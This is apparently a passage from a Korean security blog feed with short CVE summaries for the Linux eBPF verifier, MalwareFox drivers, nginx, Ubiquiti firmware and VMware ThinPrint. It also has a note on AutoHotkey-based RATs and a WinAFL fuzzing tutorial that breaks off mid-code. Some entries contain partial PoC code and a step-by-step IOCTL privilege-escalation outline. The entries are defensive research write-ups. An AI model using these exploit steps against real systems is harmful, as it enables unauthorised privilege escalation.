    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/26/cve-2021-31440-an-incorrect-bounds-calculation-in-the-linux-kernel-ebpf-verifier">CVE-2021-31440: AN INCORRECT BOUNDS CALCULATION IN THE LINUX KERNEL EBPF VERIFIER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel 5.7 ~ Linux kernel 5.11.15</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>eBPF는 런타임 중 안전하게 커널 코드를 삽입하기 위해 Verifier와 BPF instruction을 사용합니다. Verifier는 레지스터의 값의 변화와 그 값들의 허용 범위(이하 range)등을 추적해 memory load와 store의 out-of-bound 여부를 검사합니다. CVE-2021-31440을 악용하면 out-of-bound 검사를 무력화하고 로컬 권한 상승을 노릴 수 있습니다.</p><pre><code class="hljs c">...    <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umin_value))             reg-&gt;u32_min_value = (u32)reg-&gt;umin_value;     <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umax_value))             reg-&gt;u32_max_value = (u32)reg-&gt;umax_value;...</code></pre><p>위는 취약한 코드 부분의 일부입니다. 기존 eBPF 취약점들과 마찬가지로 CVE-2021-31440 또한 64 bit range의 하위 32 비트로부터 32 bit range를 도출하는 과정에서 버그가 발생합니다. <code>umin_value</code>가 1, <code>umax_value</code> 가 1&lt;&lt;32이라 할 때 <code>u32_min_value</code>는 1, <code>u32_max_value</code>는 0으로 설정되고 실제 runtime range와 다른 값을 Verifier에게 전달하게 됩니다.</p><p>Verifier는 잘못된 레지스터 허용범위를 갖게 되고 이를 통해 해커는 out-of-bound read/write access가 가능해 로컬 권한 상승을 할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>lpe</tag>
      
      <tag>oob</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31727/31728: MalwareFox AntiMalware 로컬 권한상승 취약점</title>
    <link href="/2021/05/28/l0ch/2021-05-28/"/>
    <url>/2021/05/28/l0ch/2021-05-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irql0/CVE-2021-31728">CVE-2021-31728</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MalwareFox AntiMalware 2.74.0.150</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>안티 멀웨어 소프트웨어인 MalwareFox에서 발견된 로컬 권한 상승 취약점의 세부 정보 및 PoC가 공개되었습니다. 공개된 취약점은 두 가지로, 모두 MalwareFox의 <code>zam64.sys</code> 및 <code>zam32.sys</code> 드라이버에 존재합니다. </p><h3 id="CVE-2021-31727"><a href="#CVE-2021-31727" class="headerlink" title="CVE-2021-31727"></a>CVE-2021-31727</h3><p><code>zam64.sys</code>/<code>zam32.sys</code> 드라이버의 IOCTL <code>0x80002014</code> 및 <code>0x80002018</code> 은 unrestricted disk read/write가 가능합니다. 해커는 이를 악용해 부트 섹터를 덮어쓰거나 메모리 상의 코드를 덮어쓰는 방식으로 권한 상승을 트리거할 수 있습니다.</p><h3 id="CVE-2021-31728"><a href="#CVE-2021-31728" class="headerlink" title="CVE-2021-31728"></a>CVE-2021-31728</h3><p>IOCTL <code>0x80002040</code>은 UserBuffer에서 복사되는 대상 버퍼인 NonPagedPool에서 커널 메모리가 할당되며 입력 버퍼가 <code>0x1000</code> bytes보다 커 쉘코드에 사용될 수 있습니다. IOCTL <code>0x80002018</code> 은 miniport 드라이버의 IRP_MJ_SCSI_HANDLER에 대한 함수를 설정할 수 있으며 사용자 입력에 의해 지정된 드라이버에 SCSI 요청을 보내 이를 이용해 쉘코드를 실행할 수 있습니다.</p><p>위 취약점을 악용하면 아래 방법으로 드라이버 컨텍스트의 ring0 코드를 실행해 시스템 권한으로 프로세스를 실행 가능합니다.</p><ol><li>IOCTL <code>0x80002010</code>으로 <code>\.\ZemanaAntiMalware</code> 에 대한 핸들을 가져옴</li><li>IOCTL <code>0x80002040</code>으로 NonPagedPool에 커널 메모리 할당</li><li><code>SystemBigPoolInformation</code>로 할당된 커널 메모리 검색</li><li>IOCTL <code>0x80002044</code>로 miniport 드라이버 구성</li><li>IOCTL <code>0x80002014</code> 또는 <code>0x80002018</code>로 해커가 정의한 miniport 드라이버 실행</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>antimalware</tag>
      
      <tag>kernel driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-23017: nginx DNS Resolver Off-by-One Heap Write Vulnerability</title>
    <link href="/2021/05/27/idioth/2021-05-27/"/>
    <url>/2021/05/27/idioth/2021-05-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://x41-dsec.de/lab/advisories/x41-2021-002-nginx-resolver-copy/">Advisory X41-2021-002: nginx DNS Resolver Off-by-One Heap Write Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>nginx 0.6.18 - 1.20.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>오픈 소스 웹 서버 프로그램 nginx의 <code>ngx_resolver_copy()</code>에서 DNS response를 처리하는 동안 발생하는 off-by-one으로 인해 heap 영역의 1-byte 메모리를 덮어쓸 수 있는 취약점이 발견되었습니다.</p><p><code>ngx_resolver_copy()</code>는 DNS response에 포함된 DNS 도메인 이름의 유효성을 검사하고 압축을 해제하는 작업을 다음 두 단계로 처리합니다.</p><ol><li>압축되지 않은 도메인 이름 크기인 <code>len</code>을 계산하고 128 포인터가 넘어가거나 버퍼의 범위를 벗어나는 부분을 버립니다.</li><li>Output buffer를 할당하고 압축되지 않은 이름을 복사합니다.</li></ol><p>이 과정에서 1번의 <code>len</code>과 2번에 압축되지 않은 이름의 크기가 달라 <code>name-&gt;data</code>에서 1 바이트를 벗어나 덮어쓸 수 있습니다.</p><p>nginx DNS response를 받기 위해 DNS request를 보낸 후, <code>QNAME</code>, <code>NAME</code>, <code>RDATA</code> 중 하나의 값을 통해 해당 취약점을 트리거할 수 있습니다. 또한 <code>CNAME</code>을 사용할 경우 재귀적으로 처리되어 <code>ngx_resolve_name_locked()</code>가 호출될 때 추가적인 OOB write가 가능하고 <code>ngx_resolver_dup()</code>과 <code>ngx_crc32_short()</code>를 통해 OOB read가 가능합니다.</p><p>해당 취약점의 POC 코드는 <a href="https://github.com/x41sec/advisories/blob/master/X41-2021-002/poc.py">github</a>에서 확인할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>oob read</tag>
      
      <tag>dns resolver</tag>
      
      <tag>oob write</tag>
      
      <tag>nginx</tag>
      
      <tag>dns</tag>
      
      <tag>off-by-one</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-22909: Ubiquiti 라우터 펌웨어 업데이트 취약점</title>
    <link href="/2021/05/26/fabu1ous/2021-05-26/"/>
    <url>/2021/05/26/fabu1ous/2021-05-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/24/cve-2021-22909-digging-into-a-ubiquiti-firmware-update-bug">CVE-2021-22909- DIGGING INTO A UBIQUITI FIRMWARE UPDATE BUG</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Ubiquiti EdgeRouter</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>CVE-2021-22909에 대한 패치가 이루어졌습니다. Ubiquiti EdgeRouter의 펌웨어 업데이트 작업에 MiTM(man-in-the-middle) 공격에 대한 방지 부재로 인해 라우터 기기에 악성 펌웨어 이미지를 설치할 수 있었습니다. 해커는 이를 악용해 라우터 기기에 악성 펌웨어를 설치할 수 있고 root 권한으로 임의 코드 실행이 가능합니다.</p><p>Ubiquiti EdgeRouter는 templated operational command를 지원합니다. Templated operational command란 라우터의 설정을 빠르고 간편하게 수정할 수 있도록 짜인 스크립트 실행 명령어입니다. 유저가 CLI에 <code>add system image</code>를 입력하면 <code>ubnt-fw-latest</code> 스크립트가 실행되어 펌웨어를 업데이트할 수 있습니다.</p><p><code>unbt-fw-latest</code> 스크립트는 <code>upgrade_firmware()</code>함수를 호출해 Ubiquiti update server로부터 다운 로드 URL을 포함한 최신 펌웨어 정보를 받아옵니다. 그 후 받아온 정보를 파싱 해 현재 펌웨어 버전과 비교하고 업데이트가 가능하면 <code>ubnt-upgrade</code> 스크립트를 실행해 제공받은 url로부터 펌웨어를 설치합니다.</p><p><code>ubnt-upgrade</code> 스크립트가 호출하는 <code>get_tar_by_url()</code> 함수는 curl 커맨드를 사용해 펌웨어를 설치하는데 -k 옵션(TLS 인증서 검증 비활성화)이 설정되어있어 취약점이 발생합니다. 해커는 MITM으로 자신의 도메인을 속여 라우터에 악성 펌웨어를 설치할 수 있습니다.</p><pre><code class="hljs powershell">get_tar_by_url () &#123;     mkdir <span class="hljs-variable">$TMP_DIR</span>     <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NOPROMPT</span>&quot;</span> -<span class="hljs-type">eq</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Trying to get upgrade file from <span class="hljs-variable">$TAR</span>&quot;</span>     fi       <span class="hljs-keyword">if</span> [ -<span class="hljs-type">n</span> <span class="hljs-string">&quot;<span class="hljs-variable">$USERNAME</span>&quot;</span> ]; then         auth=<span class="hljs-string">&quot;-u <span class="hljs-variable">$USERNAME:</span><span class="hljs-variable">$PASSWORD</span>&quot;</span>     <span class="hljs-keyword">else</span>         auth=<span class="hljs-string">&quot;&quot;</span>     fi       filename=<span class="hljs-string">&quot;<span class="hljs-variable">$</span>&#123;TMP_DIR&#125;/<span class="hljs-variable">$</span>&#123;TAR##*/&#125;&quot;</span>     <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NOPROMPT</span>&quot;</span> -<span class="hljs-type">eq</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">curl</span> <span class="hljs-literal">-k</span> <span class="hljs-variable">$auth</span> <span class="hljs-operator">-f</span> <span class="hljs-literal">-L</span> <span class="hljs-literal">-o</span> <span class="hljs-variable">$filename</span> <span class="hljs-variable">$TAR</span>      <span class="hljs-comment"># &lt;-----  </span>    <span class="hljs-keyword">else</span>         <span class="hljs-built_in">curl</span> <span class="hljs-literal">-k</span> <span class="hljs-variable">$auth</span> <span class="hljs-operator">-f</span> <span class="hljs-literal">-s</span> <span class="hljs-literal">-L</span> <span class="hljs-literal">-o</span> <span class="hljs-variable">$filename</span> <span class="hljs-variable">$TAR</span>   <span class="hljs-comment"># &lt;----- </span>    fi     <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$</span>? -<span class="hljs-type">ne</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Unable to get upgrade file from <span class="hljs-variable">$TAR</span>&quot;</span>         <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$filename</span>         <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$DOWNLOADING</span>         <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span>     fi       <span class="hljs-keyword">if</span> [ ! -<span class="hljs-type">e</span> <span class="hljs-variable">$filename</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Download of <span class="hljs-variable">$TAR</span> failed&quot;</span>         <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$DOWNLOADING</span>         <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span>     fi       <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NOPROMPT</span>&quot;</span> -<span class="hljs-type">eq</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Download succeeded&quot;</span>     fi       TAR=<span class="hljs-variable">$filename</span> &#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>router</tag>
      
      <tag>misconfiguration</tag>
      
      <tag>firmware patch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21987: VMWare Workstation 가상 프린터의 OOB read 취약점</title>
    <link href="/2021/05/25/l0ch/2021-05-25/"/>
    <url>/2021/05/25/l0ch/2021-05-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/houjingyi233/my-bugs/tree/main/CVE-2021-21987-vmware-out-of-bounds%20read%20vulnerability%20via%20Cortado%20ThinPrint">CVE-2021-21987-vmware-out-of-bounds read vulnerability via Cortado ThinPrint</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>VMware Workstation 16.1.2 이전</li><li>Horizon Client 5.5.2 이전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>VMWare Workstation 및 Windows용 Horizon Client에 설치된 Windows 10의 가상 프린터 구성요소에서 발견된 범위를 벗어난 읽기(Out-of-Bound Read) 취약점의 PoC가 공개되었습니다.</p><p>VMWare의 가상 프린터인 ThinPrint 구성 요소는 게스트 Windows에서 문서 및 이미지를 파싱해 호스트 OS에 연결된 프린터로 출력할 수 있는 기능을 지원합니다. 취약점은 <code>rundll32.exe</code>에서 로드되는 <code>TPView.dll</code>이 폰트 확장자 <code>TrueType Font(TTF)</code>를 파싱하는 코드에 존재하며 TTF 파일의 검증이 충분히 이루어지지 않아 해커의 악성 TTF 파일을 파싱하는 과정에서 메모리를 읽어 정보 유출로 이어질 수 있습니다. 아래는 COM1 포트의 가상 프린터를 활성화하고 악성 TTF 파일을 전달하는 PoC의 일부입니다.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TPVM</span>:</span>SERIAL_PORT=<span class="hljs-string">b&#x27;\\\\\\\\.\\\\COM1&#x27;</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>        self.hPort=windll.kernel32.CreateFileA(self.SERIAL_PORT,                                               <span class="hljs-number">0xc0000000</span>, <span class="hljs-comment"># GENERIC_READ | GENERIC_WRITE</span>                                               <span class="hljs-number">3</span>,          <span class="hljs-comment"># FILE_SHARE_READ | FILE_SHARE_WRITE</span>                                               <span class="hljs-literal">None</span>,                                               <span class="hljs-number">3</span>,          <span class="hljs-comment"># OPEN_EXISTING</span>                                               <span class="hljs-number">0</span>,                                               <span class="hljs-literal">None</span>)        <span class="hljs-keyword">if</span> (self.hPort &amp; <span class="hljs-number">0xffffffff</span>) == <span class="hljs-number">0xffffffff</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;the serial port could not be opened (0x%08x)&#x27;</span>%(GetLastError()))        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> windll.kernel32.SetupComm(self.hPort, <span class="hljs-number">0x20000</span>, <span class="hljs-number">0x84d0</span>):            <span class="hljs-keyword">raise</span> WinError()...t = TPVM()...f = open(<span class="hljs-string">&quot;poc.ttf&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)font_data = f.read()f.close()emri_engine_font = struct.pack(<span class="hljs-string">&#x27;&lt;IIIII&#x27;</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">8</span> + FONT_COUNT * <span class="hljs-number">4</span> + len(font_data) + <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, FONT_COUNT, len(font_data))emri_engine_font += binascii.a2b_hex(<span class="hljs-string">&#x27;00000000&#x27;</span>)emri_engine_font += font_data<span class="hljs-comment"># Put it all together.</span>data_plaintext = devmode + emfspool_hdr + emf + emri_metafile_ext + emri_engine_fontdata_compressed = zlib.compress(data_plaintext, <span class="hljs-number">9</span>)print_command = struct.pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, <span class="hljs-number">0</span>) + struct.pack(<span class="hljs-string">&#x27;&lt;II&#x27;</span>, len(data_compressed), len(data_plaintext)) + data_compressed<span class="hljs-comment"># Send the printing command.</span>t.do_data(print_command)t.do_command(<span class="hljs-number">0x8002</span>)t.close()</code></pre><p>해당 취약점은 지난 2016년 Google Project Zero가 발견한 <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=849">CVE-2016-7083</a> 과 유사한 것으로 알려졌습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>oob read</tag>
      
      <tag>out-of-bounds</tag>
      
      <tag>vmware</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] AutoHotkey 기반 악성코드 공격 주의</title>
    <link href="/2021/05/24/idioth/2021-05-24/"/>
    <url>/2021/05/24/idioth/2021-05-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://thehackernews.com/2021/05/experts-warn-about-ongoing-autohotkey.html">Experts Warn About Ongoing AutoHotkey-Based Malware Attacks</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>여러 사이버 보안 연구원들이 Microsoft Windows를 타깃으로 한 Revenge RAT, LimeRAT, AsyncRAT, Houdini, Vjw0rm 등의 RAT에 AutoHotkey(AHK) 스크립트 언어를 사용하는 것이 발견하였습니다.</p><p><a href="https://www.autohotkey.com/">AutoHotkey(AHK)</a>는 Windows 애플리케이션에서 매크로, 소프트웨어 자동화 등에 사용되는 오픈 소스 커스텀 스크립트 언어입니다.</p><p>AHK 악성 파일은 <code>FileInstall</code> 명령어를 통해 AHK 인터프리터, AHK 스크립트, 파일들을 포함하여 독립적인 실행 파일로 만들어집니다. 악성코드 제작자들은 정상적인 프로그램으로 위장하기 위해 악성 스크립트와 정상적인 파일들을 묶어서 악성 실행 파일을 생성하였습니다. RAT 악성코드 감염은 AHK 실행 파일에서 시작되며 공격 체인과 상관없이 VBScript를 드롭하고 실행하여 RAT 파일을 로드합니다.</p><p>3월 31일에 발견된 악성코드는 AHK 실행 파일을 통해 RAT 파일을 드롭하고 배치 스크립트를 통해 Microsoft Defender를 비활성화하였습니다. 또 다른 악성코드는 피해자의 <a href="https://en.wikipedia.org/wiki/Hosts_(file)">hosts 파일</a>을 변조하여 유명한 악성코드들이 접근하는 것을 막았습니다.</p><p>다른 악성코드들 또한 AHK 실행 파일에서 VBScript나 Powershell을 통해 RAT 파일을 드롭하고, Microsoft Defender를 비활성화하는 등의 공통점이 발견되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>autohotkey</tag>
      
      <tag>rat</tag>
      
      <tag>trojan</tag>
      
      <tag>vbscript</tag>
      
      <tag>powershell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] WinAFL로 마구 퍼징하기 Part1</title>
    <link href="/2021/05/23/fabu1ous/winafl-1/"/>
    <url>/2021/05/23/fabu1ous/winafl-1/</url>
    
    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p>안녕하세요 Fabu1ous입니다. 최근 버그 바운티 프로젝트를 하면서 WinAFL 사용법을 익히고 있습니다. WinAFL은 프로세스를 종료하지 않고 Harness 프로그램을 통해 특정 함수만을 반복 실행하는 방식을 사용해 빠른 퍼징이 가능합니다. Harness는 수레를 끌 수 있도록 말에게 씌우는 제갈, 말안장, 고삐 등이 합쳐진 기구입니다. <del>한글로는 마구라고 부르는데 마구로 마구 퍼징 하면 크래시가 마구마구 터지나?</del></p><p><img src="/2021/05/23/fabu1ous/winafl-1/1.png"></p><p>WinAFL에 대한 간단한 소개와 직접 Harness를 작성해본 과정을 정리해봤습니다. 이번 Part 1에선 처음 Harness를 작성하고 퍼징 해본 과정을, 다음 글인 Part 2에선 Harness의 속도 개선을 위해 삽질한 과정을 써볼까 합니다. </p><h1 id="WinAFL"><a href="#WinAFL" class="headerlink" title="WinAFL"></a>WinAFL</h1><p>AFL(American Fuzzy Lop)은 Coverage-guided 퍼징 툴입니다. Execution path 분석을 통한 넓은 코드 커버리지와 루프 실행을 통한 빠른 속도가 특징입니다. 그리고 이러한 AFL을 Windows에서 사용할 수 있게 변형한 것이 바로 WinAFL입니다.</p><p>이번 시리즈에선 WinAFL의 빠른 퍼징 속도에 집중해볼까 합니다. WinAFL의 반복 실행(iteration)은 다른 퍼저 들과 다른 방식을 사용하는데 이는 다음과 같습니다.</p><ol><li>타겟 함수에 도달할 때까지 프로그램 실행</li><li>코드 커버리지 기록</li><li>타겟 함수가 리턴할 때까지 실행</li><li>코드 커버리지 회수, input 파일 수정, EIP를 조작해 2번 과정으로 복귀</li><li>일정 횟수만큼 반복 실행 후 타겟 프로세스를 종료, 1번부터 다시 시작</li></ol><p>여기서 중요한 게 바로 4번 과정, 즉 프로세스를 종료하지 않고 타겟 함수만 반복 실행을 한다는 것입니다. 매번 프로세스를 종료하고 재시작하는데 드는 시간을 절약할 수 있고 타겟 함수와 그 서브 루틴만을 퍼징 하기 때문에 그만큼 빠른 속도를 낼 수 있습니다.</p><h1 id="환경-설정"><a href="#환경-설정" class="headerlink" title="환경 설정"></a>환경 설정</h1><p>기본적인 설명이 끝났으니 직접 사용해봐야겠죠? <a href="https://github.com/googleprojectzero/winafl">WinAFL 공식 깃허브</a>에 빌드하는 방법이 쓰여있기는 하지만 저는 그걸 보고도 삽 집해서 글로 남겨놓겠습니다. <del>멍청이</del></p><p><img src="/2021/05/23/fabu1ous/winafl-1/2.png"></p><h3 id="준비물"><a href="#준비물" class="headerlink" title="준비물"></a>준비물</h3><ol><li>Visual Studio</li><li>DynamoRIO</li><li>cmake</li><li>WinAFL</li></ol><p>각각 공식 홈페이지나 깃허브에서 쉽게 구하실 수 있습니다. 설마 여기서부터 막히시는 분은 없으리라 생각합니다. 웬만하면(특히 Visual Studio는) 최신 버전으로 준비해주세요.  </p><p><img src="/2021/05/23/fabu1ous/winafl-1/3.png"></p><pre><code class="hljs apache"><span class="hljs-attribute">mkdir</span> build<span class="hljs-number">32</span><span class="hljs-attribute">cd</span> build<span class="hljs-number">32</span><span class="hljs-attribute">cmake</span> -G<span class="hljs-string">&quot;Visual Studio 16 2019&quot;</span> -A Win<span class="hljs-number">32</span> .. -DDynamoRIO_DIR=%DynamoRIO경로%\cmake</code></pre><p>Visual Studio의 command prompt를 관리자 권한으로 실행하고 winafl-master 폴더 내부로 들어가 위 명령어들을 실행해 주시면 됩니다. 저는 32bit짜리 DLL을 퍼징 하기 위해 <code>x86_x64 Cross Tools Command Prompt</code>를 사용했습니다. <code>-DDynamoRIO</code> 옵션 값에 DynamoRIO 속에 있는 cmake 폴더로 지정해주셔야 합니다.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/4.png"></p><p>위 사진과 같이 Configuring done, Generateing done이 출력된다면 빌드 준비가 끝났습니다.</p><pre><code class="hljs bash">cmake --build . --config Release</code></pre><p>이제 위 명령어를 입력해 빌드해주시면 됩니다. 빌드가 잘 되었다면 <code>%winafl-master%\build32\bin\Release</code>에 afl-fuzz.exe와 winafl.dll이 있습니다. 실제로 퍼징을 돌릴 때 사용할 친구들이니 꼭 위치를 기억해두세요. git clone 하면서 이미 컴파일된 실행파일도 존재하는데 이것들과 햇갈리시면 안 됩니다.</p><h1 id="Target-Function"><a href="#Target-Function" class="headerlink" title="Target Function"></a>Target Function</h1><p>WinAFL은 프로세스를 종료하지 않고 타겟 함수만을 반복 실행합니다. 아무 함수나 타겟으로 잡고 퍼징을 돌릴 수 있는 것은 아니고 몇 가지 충족해야 할 조건들이 있습니다. 따라서 퍼징에 들어가기 앞서 먼저 타겟 프로그램에 대한 분석을 해야 하고 타겟 함수 선정에 많은 시간을 투자하게 될 수도 있습니다. <del>참 깐깐하내</del></p><p>타겟 함수는 다음과 같은 조건을 만족해야 합니다.</p><ol><li>함수 내에서 input 파일을 열어야 함</li><li>그 파일을 파싱 해야 함</li><li>함수 내에서 input 파일을 닫아야 함</li><li>리턴까지 정상적으로 실행되어야 함</li></ol><p>위 조건을 만족하는 함수를 찾기 위해 제가 사용한 방법을 작성해보겠습니다. 우선 타겟 함수를 찾기 위해선 타겟 프로그램이 어떤 DLL을 사용하는지, 그 DLL의 역할은 무엇인지 대강 알아야 합니다.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/5.png"></p><p>마우스 커서를 DLL위에 올려보면 파일 설명, 제조사, 파일 버전 등의 정보를 얻을 수 있고 이는 1차적으로 타겟 DLL을 정하는데 도움이 됩니다. </p><p><img src="/2021/05/23/fabu1ous/winafl-1/6.png"></p><p>적당한 DLL을 찾으셨다면 IDA로 열어서 Exports 테이블 훑어봅시다. 운이 좋다면 External symbol이 살아있는 함수들 중 이름에 File 어쩌고저쩌고하는 함수가 몇 개 있을수도 있습니다. 이름만 보고도 타겟 함수의 자질이 보이는 경우가 있을 텐데 디컴파일한 후 위 조건에 충족하는지 확인해 보시면 됩니다. 저처럼 External symbol이 살아있는 함수가 거의 없고 그마저도 타겟 함수 충족 조건에 만족하지 않는다면</p><p><img src="/2021/05/23/fabu1ous/winafl-1/7.png"></p><p>Imports 테이블에서 파일 함수(예를 들면 fopen, wfopen, wfopen_s, fclose 등)를 검색해보시면 됩니다. 이래도 없다면 저는 다른 타겟을 찾아보는데 더 좋은 방법을 알고 계신 분이 있다면 댓글로 남겨주세요. 저는 Imports 테이블에서 해당 DLL이 <code>MSVCR100!fclose()</code>를 사용한다는 사실을 알아냈습니다.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/8.png"></p><p><img src="/2021/05/23/fabu1ous/winafl-1/9.png"></p><p>그다음 Windbg로 타겟 프로그램을 열어 방금 알아낸 <code>MSVCR100!fclose()</code>에 브레이크 포인트를 걸고 어떤 함수가 호출하는지 알아냈습니다. <code>fclose()</code>의 실행이 끝나면 <code>TargetDLL+0xbf62d</code>로 리턴한다는 사실을 알 수 있고</p><p><img src="/2021/05/23/fabu1ous/winafl-1/10.png"></p><p>해당 주소를 아이다로 열어(단축키 g : Jump to address) 함수의 시작 주소를 알 수 있습니다. 디컴파일을 통해 해당 함수의 코드를 분석해본 결과 file open, file parsing, file close 작업이 모두 있었고 따라서 <code>TargetDLL+0xbf5c0</code>을 타겟 함수로 정했습니다. 약간의 팁을 드리자면 타겟 함수가 받는 인자가 적으면 적을수록 다음 단계인 Harness 작성이 쉬워집니다. 파일 이름만을 인자로 받는다면 Best!</p><h1 id="Harness"><a href="#Harness" class="headerlink" title="Harness"></a>Harness</h1><p>타겟 함수를 정했으니 이제 타겟 DLL을 로드하고 타겟 함수가 필요로 하는 초기 설정을 해주는 Harness 프로그램을 작성해야 합니다. 기본적인 틀은 다음과 같습니다.</p><ol><li>TargetDLL.dll 로드</li><li>GetProcAddress()를 호출해 타겟 함수의 주소를 받아옴</li><li>타겟 함수 호출</li></ol><p>아쉽게도 제가 정한 타겟 함수는 심볼이 죽어있더군요. GetProcAddress()를 사용해 함수 주소를 받아올 수 없으니 다음과 같이 수정했습니다.</p><ol><li>TargetDll.dll 로드</li><li>TargetDll.dll의 base 주소 + 타겟 함수의 offset = 타겟 함수 주소</li><li>타겟 함수 호출</li></ol><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*TARGET)</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span>* filename)</span></span>;TARGET funcPtr;<span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) __declspec(noinline) <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fuzzme</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span>* path)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> result = funcPtr(path);<span class="hljs-keyword">return</span> result;&#125; <span class="hljs-comment">// 퍼저에 지정해줄 반복 실행 대상입니다. Extern symbol을 